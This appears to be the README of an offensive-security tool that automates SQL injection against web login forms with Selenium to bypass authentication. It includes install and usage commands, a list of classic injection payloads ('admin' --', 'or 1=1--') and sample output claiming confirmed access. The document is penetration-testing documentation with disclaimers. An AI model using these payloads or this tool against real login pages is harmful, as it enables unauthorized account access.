## **SQL Injection Authentication Bypass Tool**

This Python script automates SQL injection attacks on web application login forms to bypass authentication and gain unauthorized access. It uses Selenium WebDriver for automation, interacting with login forms and attempting various SQL injection payloads to exploit potential vulnerabilities.

---

### **Features**

- **Automated SQL Injection Attacks**: Attempts various SQL injection payloads to bypass login.
- **Selenium WebDriver**: Uses Firefox (via GeckoDriver) to interact with the web forms.
- **Alert Handling**: Handles unexpected JavaScript alerts during the login process.
- **Form Interaction**: Automatically fills in the username and password fields with the payload and submits the form.
- **Success Detection**: Checks for successful login based on redirection or the presence of a logout button.
- **Error Handling**: Catches issues like missing elements or timeouts during form interaction.

---

### **Requirements**

To run the script, you'll need:

- **Python 3.x**: Ensure Python 3 is installed.
- **GeckoDriver**: Required to run Selenium with Firefox. Download it from [GeckoDriver Releases](https://github.com/mozilla/geckodriver/releases) and ensure it's in your PATH.
- **Firefox**: Selenium uses Firefox, so make sure it’s installed.
  
### **Python Libraries**:

You’ll need the following Python libraries:

- `selenium`
- `termcolor`

You can install them using the following command:

```bash
pip install -r requirements.txt
```

---

### **Installation and Setup**

1. **Clone the repository**:

```bash
git clone https://github.com/0xgh057r3c0n/AuthBypass.git
cd AuthBypass
```

2. **Install the required dependencies**:

```bash
pip install -r requirements.txt
```

3. **Install GeckoDriver**:
   - Download **GeckoDriver** from [GeckoDriver Releases](https://github.com/mozilla/geckodriver/releases).
   - Extract it and add it to your system’s PATH or specify its location in the script.

---

### **Usage**

To run the script and attempt authentication bypass, use the following command:

```bash
python3 AuthBypass.py -u <target_url>
```

Replace `<target_url>` with the login page URL you want to test.

Example usage:

```bash
python3 AuthBypass.py -u http://example.com/login
```

This will attempt to bypass the login page using predefined SQL injection payloads.

---

### **Payloads Used**

The following payloads are used in the script for testing SQL injection vulnerabilities:

```plaintext
"or 1=1", "or 1=1--", "admin' --", "admin' or '1'='1", "admin' or 1=1--"
```

These payloads attempt to manipulate the backend SQL queries during authentication.

---


### **Sample Terminal Output with Banner**


```bash

   _____          __  .__   __________                                    
  /  _  \  __ ___/  |_|  |__\______   \___.__.___________    ______ ______
 /  /_\  \|  |  \   __\  |  \|    |  _<   |  |\____ \__  \  /  ___//  ___/
/    |    \  |  /|  | |   Y  \    |   \\___  ||  |_> > __ \_\___ \ \___ \ 
\____|__  /____/ |__| |___|  /______  // ____||   __(____  /____  >____  >
        \/                 \/       \/ \/     |__|       \/     \/     \/ 

    Author: 0xgh057r3con

    Version: 1.0

[*] Attempting authentication bypass on http://example.com/login
[*] Page loaded successfully at http://example.com/login
[*] Trying payload: or 1=1
[*] Trying payload: or 1=1--
[*] Trying payload: admin' --
[*] Trying payload: admin' or '1'='1
[*] Trying payload: admin' or 1=1--
[*] Clicked on the login button using JavaScript.
[*] Redirected to a potential dashboard page with payload.
[*] Logout option detected. Access confirmed.
[*] Browser will remain open for inspection.

```


---


### **Important Notes**

- **Ethical Use**: This tool is for educational purposes and authorized penetration testing only. **Do not use it on systems without explicit permission**.
- **SQL Injection Mitigation**: Some websites may use prepared statements or web application firewalls (WAFs) to prevent SQL injection.
- **False Positives/Negatives**: The script may not detect login success if the application has custom login workflows.

---

### **Contributing**

Feel free to fork the repository and submit pull requests. You can also open issues for bugs or improvements.

---

### **License**

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

---

### **Disclaimer**

**This tool is for educational and ethical use only. Unauthorized use to access systems is illegal and unethical. Ensure you have permission before performing any security testing.**
